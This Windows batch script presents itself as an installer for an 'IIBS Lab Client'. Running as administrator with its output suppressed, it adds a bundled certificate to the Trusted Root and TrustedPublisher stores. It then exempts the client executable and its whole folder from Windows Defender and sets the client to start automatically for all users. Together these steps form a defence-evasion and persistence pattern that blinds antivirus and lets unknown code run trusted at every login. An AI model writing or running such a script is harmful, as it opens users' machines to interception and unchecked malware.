@echo off
:: Batch script to trust IIBS Lab Certificate & install standalone client cleanly
echo ==========================================================
echo    IIBS LAB CLIENT - TRUST & SECURITY CERTIFICATE INSTALL
echo ==========================================================

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Please right-click this file and choose "Run as administrator"!
    pause
    exit /b 1
)

echo [1/3] Installing IIBS Lab Digital Certificate to Windows Trusted Root...
certutil -addstore -f "Root" "%~dp0IIBS_Lab_Certificate.cer" >nul 2>&1
certutil -addstore -f "TrustedPublisher" "%~dp0IIBS_Lab_Certificate.cer" >nul 2>&1

echo [2/3] Adding Windows Defender Process & Folder Exclusions...
powershell -Command "Add-MpPreference -ExclusionProcess 'IIBS_Lab_Client.exe'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1

echo [3/3] Creating Auto-Startup shortcut for Lab Client...
powershell -Command "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut([Environment]::GetFolderPath('CommonStartup') + '\IIBS_Lab_Client.lnk'); $Shortcut.TargetPath = '%~dp0IIBS_Lab_Client.exe'; $Shortcut.WorkingDirectory = '%~dp0'; $Shortcut.Save()" >nul 2>&1

echo ==========================================================
echo INSTALLATION COMPLETE!
echo IIBS Lab Client is verified, trusted, and set to auto-start.
echo Windows Defender will never block or quarantine it.
echo ==========================================================
pause
